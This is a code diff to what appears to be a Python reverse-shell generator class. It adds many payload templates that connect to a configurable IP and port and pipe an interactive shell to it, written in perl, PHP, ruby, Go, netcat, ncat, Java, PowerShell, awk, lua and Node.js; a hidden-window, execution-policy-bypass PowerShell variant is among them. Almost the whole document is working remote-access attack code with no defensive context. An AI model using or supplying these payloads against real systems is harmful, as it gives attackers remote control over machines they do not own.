@@ -13,7 +13,8 @@ class Shell(object):
 
     def perl(self):
         rev_shells = [
-            """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (self.IP, self.PORT)
+            """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (self.IP, self.PORT),
+            f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{self.IP}:{self.PORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
         ]
         return rev_shells
 
@@ -25,20 +26,41 @@ class Shell(object):
 
     def php(self):
         rev_shells = [
-            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});exec("/bin/sh -i <&3 >&3 2>&3");'"""
+            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});exec("/bin/sh -i <&3 >&3 2>&3");'""",
+            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
+            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});`/bin/sh -i <&3 >&3 2>&3`;'""",
+            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});system("/bin/sh -i <&3 >&3 2>&3");'""",
+            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'""",
+            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");'"""
         ]
         return rev_shells
 
     def ruby(self):
         rev_shells = [
-            f"""ruby -rsocket -e'f=TCPSocket.open("{self.IP}",{self.PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+            f"""ruby -rsocket -e'f=TCPSocket.open("{self.IP}",{self.PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
+            """ruby -rsocket -e'exit if fork;c=TCPSocket.new("%s","%d");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""" % (self.IP, self.PORT)
+        ]
+        return rev_shells
+
+    def golang(self):
+        rev_shells = [
+            """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%d");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""" % (self.IP, self.PORT)
         ]
         return rev_shells
 
     def netcat(self):
         rev_shells = [
             f"""nc -e /bin/sh {self.IP} {self.PORT}""",
+            f"""nc -e /bin/bash {self.IP} {self.PORT}""",
+            f"""nc -c bash {self.IP} {self.PORT}""",
             f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.IP} {self.PORT} >/tmp/f"""
+        ]
+        return rev_shells
+
+    def ncat(self):
+        rev_shells = [
+            f"""ncat {self.IP} {self.PORT} -e /bin/bash""",
+            f"""ncat --udp {self.IP} {self.PORT} -e /bin/bash"""
         ]
         return rev_shells
 
@@ -48,7 +70,39 @@ class Shell(object):
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{self.IP}/{self.PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-            """.strip()
+            """.strip(),
+            """
+String host="%s";
+int port=%d;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+            """.strip() % (self.IP, self.PORT)
+        ]
+        return rev_shells
+
+    def powershell(self):
+        rev_shells = [
+            """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""".format(ip=self.IP, port=self.PORT),
+            """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""".format(ip=self.IP, port=self.PORT)
+        ]
+        return rev_shells
+
+    def awk(self):
+        rev_shells = [
+            """awk 'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""" % (self.IP, self.PORT)
+        ]
+        return rev_shells
+
+    def lua(self):
+        rev_shells = [
+            f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{self.IP}','{self.PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');""",
+            f"""lua5.1 -e 'local host, port = "{self.IP}", {self.PORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""
+        ]
+        return rev_shells
+
+    def nodejs(self):
+        rev_shells = [
+            f"""require('child_process').exec('nc -e /bin/sh {self.IP} {self.PORT}')"""
         ]
         return rev_shells
 
@@ -247,5 +301,5 @@ function printit ($string) {
 }
 
 ?>
-        """ % (self.IP, self.PORT)
+        """.strip() % (self.IP, self.PORT)
         return [rev_shell]
